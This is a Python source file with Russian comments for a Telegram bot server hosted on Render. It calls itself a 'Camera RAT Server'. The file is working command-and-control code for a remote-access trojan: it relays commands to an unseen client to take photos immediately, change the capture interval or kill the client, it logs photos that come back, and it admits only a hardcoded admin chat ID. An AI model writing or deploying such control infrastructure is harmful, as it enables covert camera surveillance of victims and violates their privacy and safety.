#!/usr/bin/env python3
"""
Telegram Bot Server — работает на Render
Ретранслирует твои команды через Telegram
"""

import os
import sys
import time
import requests
import logging
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading

# ===== ТВОИ ДАННЫЕ =====
BOT_TOKEN = os.environ.get("BOT_TOKEN")  # Читаем секретный токен из панели Render
CHAT_ID = "8722858929"                   # Твой обновленный правильный ID
# =======================

API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(message)s',
    datefmt='%H:%M:%S'
)
log = logging.info

def send_message(chat_id, text):
    url = f"{API_URL}/sendMessage"
    try:
        resp = requests.post(url, data={'chat_id': chat_id, 'text': text}, timeout=10)
        return resp.json().get('ok', False)
    except Exception as e:
        log(f"Send error: {e}")
        return False

def get_updates(offset=None):
    url = f"{API_URL}/getUpdates"
    params = {'timeout': 30, 'offset': offset}
    try:
        resp = requests.get(url, params=params, timeout=35)
        return resp.json()
    except Exception as e:
        log(f"Updates error: {e}")
        return {'ok': False, 'result': []}

def handle_command(chat_id, text):
    text = text.strip()
    
    if text == '/start':
        send_message(chat_id,
            "🤖 Camera RAT Server\n\n"
            "Команды:\n"
            "/photo — сделать фото прямо сейчас\n"
            "/status — статус\n"
            "/interval N — изменить интервал (30, 60, 120)\n"
            "/kill — остановить клиент\n"
            "/help — помощь"
        )
        log("Отправлено приветствие")
    
    elif text == '/photo':
        send_message(chat_id, "📸 Делаю фото...")
        send_message(chat_id, "CMD:PHOTO_NOW")
        log("Отправлена команда PHOTO_NOW")
    
    elif text == '/status':
        send_message(chat_id, "✅ Сервер работает\nОжидание фото от клиента...")
        log("Запрошен статус")
    
    elif text.startswith('/interval'):
        parts = text.split()
        if len(parts) == 2 and parts[1].isdigit():
            sec = parts[1]
            send_message(chat_id, f"CMD:SET_INTERVAL {sec}")
            send_message(chat_id, f"⏱ Интервал изменён на {sec} сек")
            log(f"Интервал изменён на {sec} сек")
        else:
            send_message(chat_id, "❌ Используй: /interval 30")
    
    elif text == '/kill':
        send_message(chat_id, "💀 Останавливаю клиент...")
        send_message(chat_id, "CMD:KILL")
        log("Отправлена команда KILL")
    
    elif text == '/help':
        send_message(chat_id,
            "/photo — фото сейчас\n"
            "/status — статус\n"
            "/interval N — интервал\n"
            "/kill — стоп"
        )
    
    else:
        send_message(chat_id, f"Неизвестная команда. Используй /help")

def main():
    log("=" * 40)
    log("Camera RAT Server запущен на Render")
    log(f"Chat ID: {CHAT_ID}")
    log("=" * 40)
    log("Ожидание команд в Telegram...")
    
    last_update_id = 0
    
    while True:
        try:
            data = get_updates(offset=last_update_id + 1)
            
            if data.get('ok') and data.get('result'):
                for update in data['result']:
                    update_id = update.get('update_id', 0)
                    last_update_id = update_id
                    
                    if 'message' in update:
                        msg = update['message']
                        chat_id = msg.get('chat', {}).get('id')
                        text = msg.get('text', '')
                        
                        # Проверяем, что сообщение от нашего админа
                        if str(chat_id) == str(CHAT_ID):
                            log(f"Команда от админа: {text}")
                            handle_command(chat_id, text)
                        else:
                            log(f"Сообщение от постороннего {chat_id}: {text}")
                            send_message(chat_id, "❌ Доступа нету иди в попу")
                    
                    # Ловим фото от клиента
                    if 'photo' in update.get('message', {}):
                        chat_id = update['message']['chat']['id']
                        log(f"📸 Фото получено от клиента (chat: {chat_id})")
        
        except KeyboardInterrupt:
            log("\n👋 Остановлен")
            break
        except Exception as e:
            log(f"Ошибка в цикле обновлений: {e}")
            time.sleep(5)

# Класс-заглушка для Render, чтобы сервис не засыпал
class RenderHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/plain; charset=utf-8")
        self.end_headers()
        self.wfile.write("Бот-сервер работает!".encode("utf-8"))

def run_health_check_server():
    port = int(os.environ.get("PORT", 10000))
    server = HTTPServer(("0.0.0.0", port), RenderHandler)
    server.serve_forever()

if __name__ == "__main__":
    # 1. Запускаем веб-сервер в отдельном фоновом потоке для Render
    threading.Thread(target=run_health_check_server, daemon=True).start()
    
    # 2. Запускаем основную логику бота
    main()
